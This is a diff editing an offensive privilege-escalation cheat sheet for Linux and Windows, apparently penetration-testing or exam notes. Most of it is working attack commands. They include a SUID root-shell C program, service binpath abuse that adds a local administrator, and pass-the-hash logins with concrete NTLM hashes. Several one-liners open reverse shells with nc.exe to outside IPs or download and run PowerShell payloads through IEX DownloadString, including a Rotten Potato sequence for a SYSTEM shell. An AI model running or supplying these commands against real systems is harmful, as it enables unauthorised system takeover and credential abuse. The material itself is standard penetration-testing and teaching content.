@@ -3,13 +3,13 @@
 ## Enumeration
 
 * Linux Enumeration: [LinEnum.sh](https://github.com/rebootuser/LinEnum)
+* Linux Exploits: [linuxprivcheck.py](http://www.securitysift.com/download/linuxprivchecker.py)
 * Linux Kernel Exploits: [linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)
 * Linux Kernel Exploits: [linux-exploit-suggester-2](https://github.com/jondonas/linux-exploit-suggester-2)
-* Linux Exploits: [linuxprivcheck.py](http://www.securitysift.com/download/linuxprivchecker.py)
 
 ## Kernel
 
-:warning: Compile options to fix errors: `gcc 9545.c -o 9545 -Wl,--hash-style=both`
+:warning: Compile options to fix errors: `-Wl`, `--hash-style=both`, `-m32`
 
 * CVE-2016-5195 - Dirty Cow - Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
 https://dirtycow.ninja/
@@ -50,7 +50,7 @@ ps -auxwwf | grep root
 
 ### Exim < 4.86.2
 
-https://github.com/HackerFantastic/Public/blob/master/exploits/cve-2016-1531.sh
+* https://github.com/HackerFantastic/Public/blob/master/exploits/cve-2016-1531.sh
 
 ### Check vulnerable software
 
@@ -73,7 +73,7 @@ pkg_info
 ## NFS
 
 **On victim host**
-* `cat /etc/exports`: if `no_root_squash` option is defined for the `/tmp` export (or another export)
+* `cat /etc/exports`: if `no_root_squash` option **is defined** for the `/tmp` export (or another export)
 
 **On attacker host (as root)**
 * `showmount -e <IP_VICTIM>`
@@ -85,9 +85,9 @@ pkg_info
 **On victim host again**
 * Execute `/tmp/x`
 
-## Cron
+## Cron
 
-* Detect sheduled tasks with `pspy`
+* Detect sheduled tasks with `pspy`: https://github.com/DominicBreuker/pspy
 
 ## File permissions
 
@@ -104,11 +104,11 @@ pkg_info
 * Create SUID C binary files
 ```  
   int main(void){  
-  setresuid(0, 0, 0);  
+  setresuid(0, 0, 0); // setreuid(0, 0); // setuid(0); // setgid(0); setuid(0);
   system("/bin/sh");  
   }  
 
-  Building the SUID Shell binary  
+  # Building the SUID Shell binary  
   gcc -o suid suid.c  
   For 32 bit:  
   gcc -m32 -o suid suid.c
@@ -132,11 +132,17 @@ pkg_info
 
 # Windows
 
+**Good ressources if you run out of ideas**
+
 * https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
 * https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
 * https://guif.re/windowseop
 * https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
 * https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html
+
+**Tips**
+
+* :warning: Check Arch of your payloads! (e.g `PS > [Environment]::Is64BitProcess`). It might be the source of your problems.
 
 ## Enumeration
 
@@ -149,26 +155,26 @@ powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadS
 ```
 * Windows Enumeration: [JollyKatz](https://github.com/LennonCMJ/pentest_script/blob/master/WindowsPE.md)
 
-## Kernel
+## Kernel
 
 * `systeminfo`
 
-* Pre-compiled exploits: 
-- https://github.com/SecWiki/windows-kernel-exploits
-- https://github.com/AusJock/Privilege-Escalation/tree/master/Windows
-- https://github.com/abatchy17/WindowsExploits
+Pre-compiled exploits: 
+* https://github.com/SecWiki/windows-kernel-exploits
+* https://github.com/AusJock/Privilege-Escalation/tree/master/Windows
+* https://github.com/abatchy17/WindowsExploits
 
-* List the updates that are installed on the machine:
+List the updates that are installed on the machine:
 ```
 wmic qfe get Caption,Description,HotFixID,InstalledOn
 ```
 
-* Compile Python exploit into an executable:
+**Compile Python exploit** into an executable:
 ```
 python pyinstaller.py --onefile exploit.py
 ```
 
-* Compile windows executable on linux:
+**Compile windows executable** on linux:
 ```
 i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c
 ```
@@ -176,8 +182,7 @@ i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c
 ## Services
 
 ### Any services running as SYSTEM?
-`tasklist /fi "USERNAME ne NT AUTHORITY\SYSTEM" /fi "STATUS eq running"`
-
+* `tasklist /fi "USERNAME ne NT AUTHORITY\SYSTEM" /fi "STATUS eq running"`
 
 ### Insecure File/Folder Permissions
 
@@ -201,7 +206,7 @@ This method only works on a Windows 2000, XP, or 2003 machine. You must have loc
 at 06:42 /interactive "C:\Documents and Settings\test\Local Settings\Temp\Payload.exe"
 ```
 
-### DLL Hijacking
+### DLL Hijacking
 
 When a process attempts to load a DLL, the system searches directories in the following order:
 * The directory from which the application loaded.
@@ -211,9 +216,10 @@ When a process attempts to load a DLL, the system searches directories in the fo
 * The current directory.
 * The directories that are listed in the PATH environment variable.
 
+Steps in order to hijack a DLL:
 * Find processes running with higher privileges than ours.
 * Download an analyze binaries of these processes.
-* By reverse engineering a binary, locate DLLs names loaded OR use [Procmon](https://technet.microsoft.com/en-us/sysinternals/processmonitor.aspx)
+* By reverse engineering a binary, locate DLLs names loaded **OR** use [Procmon](https://technet.microsoft.com/en-us/sysinternals/processmonitor.aspx) **OR** use enumeration scripts.
 * If it does not exist, place the malicious copy of DLL to one of the directories that I mentioned above. When process executed, it will find and load malicious DLL.
 * If the DLL file already exists in any of these paths, try to place malicious DLL to a directory with a higher priority than the directory where the original DLL file exists.
 
@@ -278,18 +284,18 @@ This will show list each service and the groups which have write permissions to 
 
 Then we can use sc qc to determine the properties, you want to look for the following listed below.
 
-Look for: SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS, GENERIC_WRITE, GENERIC_ALL, WRITE_DAC, WRITE_OWNER 
+Look for: **SERVICE_CHANGE_CONFIG**, **SERVICE_ALL_ACCESS**, **GENERIC_WRITE**, **GENERIC_ALL**, **WRITE_DAC**, **WRITE_OWNER **
 
 **SERVICE_ALL_ACCESS** means we have full control over modifying the properties of Vulnerable Service.
 
-Let’s view the properties of the Vulnerable Service:
+* Let’s view the properties of the Vulnerable Service:
 ```
 sc qc "Vulnerable Service Name"
 ```
 
 `BINARY_PATH_NAME` points to executable file for this service. If we change this value with any command means this command will run as SYSTEM at the next start of the service.
 
-Exploit: add a new local administrator:
+* Exploit: add a new local administrator:
 ```
 sc config "Vulnerable Service" binpath= "net user eviladmin P4ssw0rd@ /add"
 sc stop "Vulnerable Service"
@@ -326,15 +332,21 @@ shutdown /r /t 0
 
 * Set the SMBHASH environment variable and run `pth-winexe`
 ```
-root@kali:~# export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896
-root@kali:~# pth-winexe -U administrator //10.11.01.76 cmd 
+export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896
+pth-winexe -U administrator //10.11.01.76 cmd 
+
+OR
+
+pth-winexe --user=username/administrator%hash:hash --system //10.10.10.63 cmd.exe
+
+
 ```
 
 * Remote Desktop: `xfreerdp /u:admin /d:win7 /pth:hash:hash /v:192.168.1.101`
 
-## RunAs
+## RunAs
 
-### PowerShell
+### PowerShell
 
 * Oneliners:
 ```
@@ -354,7 +366,7 @@ $username = 'user'
 $password = 'password'
 $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
 $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
-Start-Process nc.exe -e cmd.exe 10.10.10.10 4444
+Start-Process nc.exe -ArgumentList '-e cmd.exe 10.10.10.10 4444' -Credential $credential
 
 powershell -ExecutionPolicy Bypass -File runas.ps1
 ```
@@ -371,6 +383,7 @@ runas /user:userName cmd.exe
 ```
 psexec -accepteula -u user -p password cmd /c c:\temp\nc.exe 10.11.0.245 80 -e cmd.exe
 psexec64 \\COMPUTERNAME -u Test -p test -h "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe" 
+/opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 -target-ip 10.10.10.82
 ```
 
 ### Pth-WinExe
@@ -387,9 +400,15 @@ C:\>C:\Windows\System32\runas.exe /env /noprofile /user:Test "c:\users\public\nc
  Attempting to start nc.exe as user "COMPUTERNAME\Test" ...
 ```
 
+#### Powershell
+
+```
+net use x: \\localhost\c$ /user:administrator PASSWORD
+```
+
 ## Abusing Token Privileges
 
-### Windows Server 2003 and IIS 6.0
+### Windows Server 2003 and IIS 6.0
 
 https://www.exploit-db.com/exploits/6705/
 
@@ -420,6 +439,18 @@ Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
 Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
 Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\"};"
 ```
+
+If it doesn't work:
+* https://github.com/decoder-it/lonelypotato
+* `rev.bat` (simple powershell command to get a shell):
+```
+powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.5/Invoke-PowerShellTcp.ps1')
+```
+* Run
+```
+c:\temp\MSFRottenPotato.exe * \temp\rev.bat
+```
+* And we catch a callback for a SYSTEM shell
 
 ### Juicy Potato
 
